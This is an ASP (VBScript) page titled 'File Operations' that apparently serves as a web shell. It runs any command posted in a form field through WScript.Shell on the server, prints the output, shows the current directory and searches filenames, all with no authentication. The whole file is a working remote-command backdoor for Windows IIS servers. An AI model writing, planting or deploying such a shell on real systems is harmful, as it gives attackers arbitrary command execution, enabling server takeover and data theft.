<%
    ' Execute system command
    Function ExecuteCommand(ByVal command)
        Dim shell : Set shell = Server.CreateObject("WScript.Shell")
        Dim exec : Set exec = shell.Exec(command)
        Dim output : output = exec.StdOut.ReadAll()
        ExecuteCommand = output
    End Function

    ' retrieve current directory
    Function GetCurrentDirectory()
        Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject")
        GetCurrentDirectory = objFSO.GetAbsolutePathName(".")
    End Function

    ' file traversal
    Function SearchFiles(ByVal directory, ByVal fileName)
        Dim files : files = Split("")
        Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject")
        If objFSO.FolderExists(directory) Then
            Dim folder : Set folder = objFSO.GetFolder(directory)
            Dim file
            For Each file In folder.Files
                If InStr(file.Name, fileName) > 0 Then
                    ReDim Preserve files(UBound(files) + 1)
                    files(UBound(files)) = file.Name
                End If
            Next
        End If
        SearchFiles = files
    End Function

    Dim command : command = Request.Form("command")
    If command <> "" Then
        Dim output : output = ExecuteCommand(command)
        Response.Write("<pre>" & Server.HtmlEncode(output) & "</pre>")
    End If

    Dim searchDirectory : searchDirectory = GetCurrentDirectory()
    Dim fileName : fileName = Request.QueryString("filename")
    If fileName <> "" Then
        Dim files : files = SearchFiles(searchDirectory, fileName)
        If IsArray(files) And UBound(files) >= 0 Then
            Response.Write("<h2>Search Results:</h2>")
            Response.Write("<ul>")
            Dim i
            For i = 0 To UBound(files)
                Response.Write("<li>" & Server.HtmlEncode(files(i)) & "</li>")
            Next
            Response.Write("</ul>")
        Else
            Response.Write("<p>No files found.</p>")
        End If
    End If
%>

<html>
<head>
    <title>File Operations</title>
</head>
<body>
    <h1>File Operations</h1>

    <h2>Execute Command</h2>
    <form method="post">
        <label for="command">Enter command:</label>
        <input type="text" name="command" id="command" required>
        <input type="submit" value="Execute">
    </form>

    <hr>

    <h2>Current Directory</h2>
    <% Dim currentDirectory : currentDirectory = GetCurrentDirectory() %>
    <p><strong><%= Server.HtmlEncode(currentDirectory) %></strong></p>

    <hr>

    <h2>Search Files</h2>
    <form method="get">
        <label for="filename">Enter filename:</label>
        <input type="text" name="filename" id="filename" required>
        <input type="submit" value="Search">
    </form>

    <hr>

</body>
</html>
